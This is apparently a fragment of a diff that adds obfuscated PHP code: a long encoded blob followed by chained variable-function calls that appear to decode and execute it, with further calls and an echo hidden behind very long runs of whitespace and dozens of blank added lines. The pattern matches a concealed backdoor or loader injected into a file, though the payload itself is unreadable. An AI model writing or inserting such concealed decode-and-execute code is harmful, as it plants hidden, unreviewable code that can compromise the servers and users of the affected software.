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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
